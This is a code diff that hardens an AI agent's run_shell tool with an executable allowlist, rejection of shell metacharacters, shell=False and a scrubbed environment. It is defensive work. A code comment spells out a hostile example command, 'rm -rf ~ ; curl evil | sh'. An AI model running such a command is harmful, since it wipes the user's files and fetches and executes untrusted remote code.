@@ -14,6 +14,8 @@ from __future__ import annotations
 
 import json
 import logging
+import os
+import shlex
 import subprocess
 from datetime import datetime, timezone
 from pathlib import Path
@@ -80,19 +82,73 @@ def _make_write_file(allowlist: list[Path]) -> Callable[[dict], str]:
     return write_file
 
 
+# run_shell executes ONE program from this allowlist with plain arguments,
+# via shell=False. There is no shell involved, so a model-emitted
+# `rm -rf ~ ; curl evil | sh` cannot chain, pipe, redirect, glob, or
+# command-substitute — those tokens are rejected outright below, and even
+# if they weren't, they would be passed as literal argv strings, never
+# interpreted. Widen this set deliberately, never with a wildcard.
+_SHELL_ALLOWED_EXECUTABLES = frozenset({
+    "ls", "cat", "echo", "pwd", "head", "tail", "wc", "grep", "find",
+    "git", "python", "python3", "pip", "pip3", "date", "whoami", "uname",
+    "sort", "uniq", "diff", "which",
+})
+
+# Shell metacharacters that only make sense with a real shell. We never use
+# one, but rejecting them gives the model a clear error instead of a
+# baffling "no such file or directory" when it tries to pipe.
+_SHELL_FORBIDDEN_TOKENS = ("`", "$(", "${", ">", "<", "|", "&", ";", "\n", "\r")
+
+
 def _run_shell(tool_input: dict) -> str:
+    raw = tool_input.get("command", "")
+    if not isinstance(raw, str) or not raw.strip():
+        return "Error: empty command."
+
+    for token in _SHELL_FORBIDDEN_TOKENS:
+        if token in raw:
+            return (
+                f"Error: '{token}' is not allowed. run_shell runs a single program "
+                "with plain arguments — no pipes, redirection, chaining, or command "
+                "substitution. Run one command at a time."
+            )
+
+    try:
+        argv = shlex.split(raw)
+    except ValueError as e:
+        return f"Error: could not parse command ({e})."
+    if not argv:
+        return "Error: empty command."
+
+    executable = os.path.basename(argv[0])
+    if executable not in _SHELL_ALLOWED_EXECUTABLES:
+        return (
+            f"Error: '{executable}' is not on the allowed-command list. "
+            f"Allowed: {sorted(_SHELL_ALLOWED_EXECUTABLES)}."
+        )
+
     project_root = Path(__file__).resolve().parents[2]
+    # Do not leak the parent process's environment (which has loaded .env
+    # secrets) into a model-directed subprocess.
+    safe_env = {
+        "PATH": os.environ.get("PATH", "/usr/bin:/bin:/usr/local/bin"),
+        "HOME": str(Path.home()),
+        "LANG": os.environ.get("LANG", "en_US.UTF-8"),
+    }
     try:
         result = subprocess.run(
-            tool_input["command"],
-            shell=True,
+            argv,
+            shell=False,
             cwd=str(project_root),
             capture_output=True,
             text=True,
             timeout=30,
+            env=safe_env,
         )
     except subprocess.TimeoutExpired:
         return "Error: command timed out after 30 seconds"
+    except FileNotFoundError:
+        return f"Error: '{executable}' is not installed."
     output = (result.stdout + result.stderr).strip()
     return output[:4000] if output else "(no output)"
 
@@ -143,8 +199,13 @@ def build_tools(cfg: Config) -> dict[str, Tool]:
         ),
         "run_shell": Tool(
             name="run_shell",
-            description="Run a shell command in the project directory. 30s timeout.",
-            parameters={"command": "string"},
+            description=(
+                "Run ONE allowed program with plain arguments in the project "
+                "directory (no pipes/redirection/chaining). 30s timeout. Allowed "
+                "programs: ls, cat, echo, pwd, head, tail, wc, grep, find, git, "
+                "python, pip, date, whoami, uname, sort, uniq, diff, which."
+            ),
+            parameters={"command": "string, e.g. 'git status' or 'grep -r TODO src'"},
             handler=_run_shell,
             confirm_key="run_shell_command",
         ),
@@ -191,7 +252,11 @@ class ToolGuard:
         if tool.name == "write_file":
             return f"write to {tool_input.get('path', 'a file')}"
         if tool.name == "run_shell":
-            return f"run this shell command: {tool_input.get('command', '')}"
+            return f"run this command: {tool_input.get('command', '')}"
+        if tool.name.startswith("browser_"):
+            action = tool.name[len("browser_"):]
+            detail = tool_input.get("url") or tool_input.get("text") or tool_input.get("element") or ""
+            return f"perform a browser {action} action" + (f" ({detail})" if detail else "")
         return f"use {tool.name}"
 
     def log(self, tool_name: str, tool_input: dict, result: str) -> None:
